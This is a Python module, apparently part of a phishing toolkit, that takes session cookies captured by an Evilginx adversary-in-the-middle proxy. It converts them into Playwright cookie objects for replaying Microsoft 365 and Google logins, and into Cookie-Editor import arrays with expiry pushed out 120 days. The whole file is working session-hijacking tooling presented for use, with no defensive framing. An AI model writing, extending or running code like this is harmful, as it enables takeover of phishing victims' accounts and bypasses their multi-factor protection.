"""cookies — session-cookie extraction + conversions (single source of truth).

Replaces the four extractor copies and the two divergent to_playwright_cookies
implementations. Both proven behaviors are preserved via parameters:

  to_playwright_cookies(cands, samesite="lax", force_secure=True)
    default = the ms365-proven style (always secure + SameSite Lax)
    egmcp's Google replay passes samesite=None, force_secure=False
    (conditional secure for google.com / __Host- / __Secure-, no SameSite)

Import gotchas encoded here (field-proven):
  - expires < 0 means a session cookie: omit the field entirely (never -1)
  - __Host- cookies are URL-scoped (url=, no domain/path — RFC 6265bis)
"""
import time


def cookies_from_session(detail):
    """Flatten an evilginx session-detail dict -> [{domain,name,value,path,httpOnly}]."""
    out = []
    for dom, cs in (detail.get("tokens") or {}).items():
        for name, c in (cs or {}).items():
            out.append({"domain": dom, "name": name, "value": c.get("Value", ""),
                        "path": c.get("Path", "/") or "/",
                        "httpOnly": bool(c.get("HttpOnly", False))})
    return out


def _needs_secure(dom, name):
    return "google.com" in dom or name.startswith(("__Host-", "__Secure-"))


def to_playwright_cookies(cands, samesite="lax", force_secure=True):
    out = []
    for c in cands:
        dom = (c.get("domain") or "").lstrip(".")
        name = c.get("name") or ""
        value = c.get("value") or ""
        if not dom or not name or value == "":
            continue
        pc = {"name": name, "value": value}
        if name.startswith("__Host-"):
            # URL-scoped: no domain attribute at all, and playwright then
            # rejects a path too — the url carries both.
            pc["url"] = f"https://{dom}/"
            pc["secure"] = True
        else:
            pc["domain"] = c["domain"] if c["domain"].startswith(".") else dom
            pc["path"] = c.get("path", "/") or "/"
            pc["secure"] = True if force_secure else _needs_secure(dom, name)
        if c.get("httpOnly") or c.get("HttpOnly"):
            pc["httpOnly"] = True
        exp = c.get("expires", c.get("Expires", c.get("expirationDate", -1)))
        if exp and exp > 0:
            pc["expires"] = int(exp)
        if samesite:
            pc["sameSite"] = samesite.capitalize() if samesite.islower() else samesite
        out.append(pc)
    return out


def cookie_editor_export(cookies, days=120):
    """Convert extracted cookies -> Cookie-Editor extension import array."""
    now = time.time()
    out = []
    for c in cookies:
        out.append({
            "domain": c["domain"],
            "expirationDate": int(now) + days * 86400,
            "hostOnly": not c["domain"].startswith("."),
            "httpOnly": bool(c.get("httpOnly")),
            "name": c["name"],
            "path": c.get("path", "/"),
            "sameSite": "no_restriction",
            "secure": True,
            "session": False,
            "storeId": None,
            "value": c["value"],
        })
    return out
